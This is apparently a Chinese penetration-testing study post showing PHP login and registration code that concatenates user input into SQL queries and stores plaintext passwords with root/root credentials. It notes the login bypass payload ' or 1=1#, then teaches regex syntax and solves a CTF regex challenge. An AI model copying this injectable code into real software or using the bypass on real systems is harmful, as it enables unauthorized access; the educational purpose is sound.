<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;登录网页&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1&gt;欢迎来到登陆界面! &lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name=&quot;login&quot; action=&quot;login.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        用户名:&lt;p&gt;&lt;input type=text name=&quot;name&quot;&gt;&lt;/p&gt;</span><br><span class="line">        密码:&lt;p&gt;&lt;input type=password name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;  name=&quot;submit&quot; value=&quot;登录&quot; &gt;</span><br><span class="line">    &lt;p&gt;还没有账号?请去&lt;a href=&quot;./register.php&quot;&gt;注册账号&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@$a = $_POST[&#x27;name&#x27;];//&#x27;@&#x27;清除报错信息</span><br><span class="line">@$b = $_POST[&#x27;password&#x27;]; //获取表单数据</span><br><span class="line">$c = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;txtx&#x27;); //链接数据库</span><br><span class="line">$s =&quot;select*from wlb where username=&#x27;$a&#x27; and password=&#x27;$b&#x27;&quot;; //查询数据库记录</span><br><span class="line">$result = mysqli_query($c,$s); //执行函数</span><br><span class="line">$d = mysqli_fetch_array($result);  //从结果集中取得一行作为关联数组</span><br><span class="line">if (empty($_POST[&#x27;name&#x27;]) || empty($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">    die(&#x27;用户名或密码为空&#x27;);</span><br><span class="line">    &#125; //判断数据是否为空数据</span><br><span class="line">if</span><br><span class="line"> ($a == $d[&#x27;username&#x27;] and $b == $d[&#x27;password&#x27;]) //比对数据库数据并判断</span><br><span class="line">&#123;</span><br><span class="line">    echo $a.&#x27;,欢迎回来 &#x27;; </span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo&quot;登录失败，用户名不存在或密码错误&quot;;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>register.php：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;用户注册页面&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;注册页面&lt;/h1&gt;</span><br><span class="line">&lt;form action=&quot;register.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;p&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;密 码： &lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/p&gt;</span><br><span class="line">&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;注册&quot;  &gt;</span><br><span class="line">&lt;p&gt;已有账号？请前往&lt;a href=&quot;./login.php&quot;&gt;登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;	 </span><br><span class="line">   </span><br><span class="line">&lt;?php@$name=$_POST[&#x27;name&#x27;];@$password=$_POST[&#x27;password&#x27;]; //获取表单数据$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;txtx&#x27;); //链接数据库$sql=&quot;select *from wlb where username=&#x27;$name&#x27;&quot;;$result = mysqli_query($conn,$sql); //执行函数$fetch = mysqli_fetch_array($result); if (!isset($_POST[&#x27;name&#x27;]) || !isset($_POST[&#x27;password&#x27;])) &#123;die(&#x27;缺少用户名密码&#x27;); &#125;if (empty($_POST[&#x27;name&#x27;]) || empty($_POST[&#x27;password&#x27;])) &#123;die(&#x27;用户名或密码为空&#x27;);&#125; //判断数据是否为空数据if($fetch[&#x27;username&#x27;]==$name)&#123;die(&#x27;该用户已注册&#x27;);&#125;else&#123;$insert=&quot;insert into wlb(username,password) values(&#x27;$name&#x27;,&#x27;$password&#x27;)&quot;;//往数据库插入表单数据mysqli_query($conn,$insert);echo &quot;注册成功&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>4)验证效果:</strong></p>
<p><strong>进入登录页面</strong></p>
<table>
<thead>
<tr>
<th>输入正确的账号密码:</th>
<th><img src="https://image.3001.net/images/20210624/1624529846_60d45bb63da0302387c4e.png!small?1624529845333" alt="1624529846_60d45bb63da0302387c4e.png!small?1624529845333"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>输入错误的账号密码:</th>
<th><img src="https://image.3001.net/images/20210624/1624529943_60d45c17734543437f575.png!small?1624529942612" alt="1624529943_60d45c17734543437f575.png!small?1624529942612"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>输入空的账号或密码:</th>
<th><img src="https://image.3001.net/images/20210624/1624530250_60d45d4a6a7de3ac4faa5.png!small?1624530249488" alt="1624530250_60d45d4a6a7de3ac4faa5.png!small?1624530249488"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>进入注册界面</strong></p>
<table>
<thead>
<tr>
<th>注册<strong>非空且账号不为wlb</strong>的 账号和密码:</th>
<th><img src="https://image.3001.net/images/20210624/1624531757_60d4632d620bf53af1639.png!small?1624531756343" alt="1624531757_60d4632d620bf53af1639.png!small?1624531756343"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>注册的数据成功进入数据库</th>
<th><img src="https://image.3001.net/images/20210624/1624544316_60d4943cb360b417bbd2b.png!small?1624544316102" alt="1624544316_60d4943cb360b417bbd2b.png!small?1624544316102"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>若注册空的账号或密码</th>
<th><img src="https://image.3001.net/images/20210624/1624544596_60d495544ee6d317aa949.png!small?1624544595651" alt="1624544596_60d495544ee6d317aa949.png!small?1624544595651"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>若注册相同的用户名</th>
<th><img src="https://image.3001.net/images/20210624/1624544731_60d495dbdd6c44ea96595.png!small?1624544731388" alt="1624544731_60d495dbdd6c44ea96595.png!small?1624544731388"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>用新的账号密码登录</strong></p>
<table>
<thead>
<tr>
<th><img src="https://image.3001.net/images/20210624/1624545148_60d4977c5062aaec45202.png!small?1624545147472" alt="1624545148_60d4977c5062aaec45202.png!small?1624545147472"></th>
<th><img src="https://image.3001.net/images/20210624/1624545156_60d497844c41a348ba64a.png!small?1624545155462" alt="1624545156_60d497844c41a348ba64a.png!small?1624545155462"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="PHP后端基础—正则表达式"><a href="#PHP后端基础—正则表达式" class="headerlink" title="PHP后端基础—正则表达式"></a>PHP后端基础—正则表达式</h2><h3 id="1-初识别SQL注入"><a href="#1-初识别SQL注入" class="headerlink" title="1.初识别SQL注入"></a>1.初识别SQL注入</h3><p>登录代码<strong>后端的php代码</strong></p>
<p><img src="https://image.3001.net/images/20210625/1624598320_60d56730f08e6ffb24be5.png!small?1624598321664" alt="1624598320_60d56730f08e6ffb24be5.png!small?1624598321664">发现在登录密码框里面写 ‘or 1=1#   <strong>也能登录成功</strong></p>
<p><strong>什么是注入：</strong></p>
<blockquote>
<p>注入攻击的本质，是<strong>把用户输入的数据当做代码执行</strong>。</p>
<p>两个关键条件：</p>
<p>第一个 <strong>是用户能够控制输入</strong> </p>
<p>第二个 <strong>是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</strong> </p>
</blockquote>
<p><strong>SQL注入：</strong></p>
<blockquote>
<p>户输入的数据当做<strong>SQL语句</strong>的代码执行</p>
</blockquote>
<p><strong>常见的防护软件主流核心：</strong></p>
<blockquote>
<p><strong>通过正则来过滤传参</strong></p>
</blockquote>
<h3 id="2-什么是正则表达式？"><a href="#2-什么是正则表达式？" class="headerlink" title="2.什么是正则表达式？"></a>2.什么是正则表达式？</h3><blockquote>
<p><strong>正则表达式</strong>（英语：Regular Expression，常简写为regex、regexp或RE），又称<strong>正则表示式</strong>、<strong>正则表示法</strong>、<strong>规则表达式</strong>、<strong>常规表示法</strong>，是计算机科学的一个概念。正则表达式使用<strong>单个字符串来描述、匹配一系列匹配某个句法规则的字符串</strong>。在很多文本编辑器里，正则表达式通常被用来<strong>检索、替换那些匹配某个模式的文本</strong>。</p>
</blockquote>
<p>正则表达式的<strong>特点</strong>：</p>
<blockquote>
<p>\1. 灵活性、逻辑性和功能性非常强；</p>
<p>\2. 可以迅速地用极简单的方式达到字符串的复杂控制。</p>
<p>\3. 对于刚接触的人来说，比较晦涩难懂。</p>
</blockquote>
<p>正则表达式<strong>用途</strong>：</p>
<blockquote>
<p><strong>判断字符串是否符合某一规则</strong>（判断是否符合手机号、邮箱规则）。</p>
<p><strong>从一个字符串中找出符合规则的所有子字符串</strong>（取HTML标签名）。</p>
</blockquote>
<p><strong>3.PHP中的正则表达式：</strong></p>
<p><strong>注：HP中使用正则规则一定要加代表正则的标识/ /</strong></p>
<blockquote>
<p><strong>preg_match_all</strong>(正则表达式、匹配字符串、匹配到的东西放入数组)</p>
<p>返回<strong>匹配到的次数</strong> </p>
<p><strong>preg_replace</strong> (正则表达式、替换成什么、匹配字符串)</p>
<p>返回<strong>替换后的结果</strong> </p>
<p>替换<strong>支持数组</strong>格式</p>
</blockquote>
<h3 id="4-正则表达式的语法"><a href="#4-正则表达式的语法" class="headerlink" title="4.正则表达式的语法"></a>4.正则表达式的语法</h3><p><strong>字符：</strong></p>
<blockquote>
<p>常用<strong>转义字符</strong>：</p>
<p>数字：\d 非数字：\D</p>
<p>空白字符（空格、制表符、换页符等）：\s 非空白字符：\S</p>
<p>单词字符（26个英文字母+数字+下划线_）：\w 非单词字符：\W</p>
</blockquote>
<blockquote>
<p><strong>自定义字符结合</strong></p>
<p><strong>字符集合</strong>：[单个字符或字符区间]，用于<strong>匹配集合内字符.</strong></p>
<p>如：</p>
<p>**[a-z]**表示a-z这26个小写字母</p>
<p>**[0-9a-z]**表示0-9这10个数字和a-z26个小写字母</p>
<p>**[135a-h]**表示包含数字1，3，5和字母a-h这8个字母</p>
<p>注意：两个不同字符段间请<strong>勿使用,隔开</strong>。</p>
<p><strong>非集</strong>：[^单个字符或字符区间]，用于<strong>匹配非集合内字符</strong>。</p>
<p>如：</p>
<p>**[^0-9]**表示匹配所有非数字字符。</p>
<p>**[^a-zA-Z]**表示匹配所以非字母字符。</p>
</blockquote>
<p><strong>关键字：</strong></p>
<blockquote>
<p>()    =&gt; 和数学一样很像，代表这是一个整体。</p>
<p>^    =&gt;  匹配输入字符串的开始位置</p>
<p>$    =&gt; 匹配输入字符串的结尾位置</p>
<p>.     =&gt; 通配符[代表任意字符][不匹配换行]</p>
<p>*     =&gt; 匹配0次或者多次</p>
<p>+    =&gt; 匹配1次或者多次</p>
<p>\     =&gt; 转义字符<br>|      =&gt;  两项之间的一个选择。</p>
</blockquote>
<p><strong>限定符加修饰符：</strong></p>
<blockquote>
<p><strong>限定符：</strong> </p>
<p>{n}   =&gt; 例如:  0{8}   意思是指 只有连起来8个0才会被匹配</p>
<p>{n,}   =&gt;例如： 0{2,}   意思是 只要有2个0及其以上的就会被匹配</p>
<p>{n,m}  =&gt;  例如： 0{2,4} 意思是最少匹配2个0，最多匹配4个0</p>
<p>注：被匹配时，<strong>默认匹配最多的次数</strong></p>
<p><strong>修饰符：</strong></p>
<p>/i   =&gt; <strong>不区分大小写</strong>  </p>
<p>/A   =&gt; 匹配规则必须<strong>从头开始匹配</strong></p>
<p>/s   =&gt; .将<strong>匹配一切字符</strong></p>
<p>/x   =&gt; 正则表达式中的<strong>空白字符会被忽略</strong> </p>
</blockquote>
<h3 id="5-实战正则"><a href="#5-实战正则" class="headerlink" title="5.实战正则"></a>5.实战正则</h3><p><strong>代码段：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$key=&#x27;flag&#123;********************************&#125;&#x27;; </span><br><span class="line">$Regular= preg_match(&quot;/zkaq.*key.&#123;2,9&#125;:\/.*\/(key*key)/i&quot;, trim($_GET[&quot;id&quot;]), $match); </span><br><span class="line">if( $Regular )&#123;  </span><br><span class="line">  die(&#x27;key: &#x27;.$key); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>解题思路：</strong></p>
<blockquote>
<p>代码中当 <strong>if 语句</strong>中的 <strong>$Regular</strong> 为真时，<strong>结束运行并输出字符key:和变量key</strong>，从而<strong>得到flag</strong><br><strong>preg_match()函数：</strong>按正则表达式去匹配字符串，<strong>匹配到一次就停止并返回1，没有匹配到则返回0</strong>；<br>trim（）函数，<strong>去除字符串两端空白符</strong>；</p>
</blockquote>
<p><strong>正则解析：</strong></p>
<table>
<thead>
<tr>
<th>1.</th>
<th>zkaq ==&gt;zkaq</th>
</tr>
</thead>
<tbody><tr>
<td>2.</td>
<td>.* ==&gt;除换行符外匹配任意字符0次或多次(可选0次 直接忽略)</td>
</tr>
<tr>
<td>3.</td>
<td>key ==&gt;key</td>
</tr>
<tr>
<td>4.</td>
<td>.{2,9} ==&gt;除换行符外匹配任意字符最少2次最多9次(可选字符2和1)</td>
</tr>
<tr>
<td>5.</td>
<td>: ==&gt;:</td>
</tr>
<tr>
<td>6.</td>
<td>/ ==&gt;转义斜杠(/)</td>
</tr>
<tr>
<td>7.</td>
<td>( ) ==&gt;代表一个整体</td>
</tr>
<tr>
<td>8.</td>
<td>key* ==&gt;ke y*匹配0次或多次</td>
</tr>
<tr>
<td>9.</td>
<td>/i ==&gt;不区分大小写</td>
</tr>
<tr>
<td>10.</td>
<td>最后结果 ==&gt;zkaqkey21://kekey</td>
</tr>
</tbody></table>
<p>将结果GET传参赋值给参数id,得到FLAG。</p>
<p>分享一个掌控安全的0基础福利编程课程：</p>
<p>====》先有了基础才能后面才能学的更快哦。</p>
<p>链接：<a href="https://pan.baidu.com/s/1oVdSaSwWSoo0u0ASsNPhcA">https://pan.baidu.com/s/1oVdSaSwWSoo0u0ASsNPhcA</a><br>提取码：TXTX</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
</search>
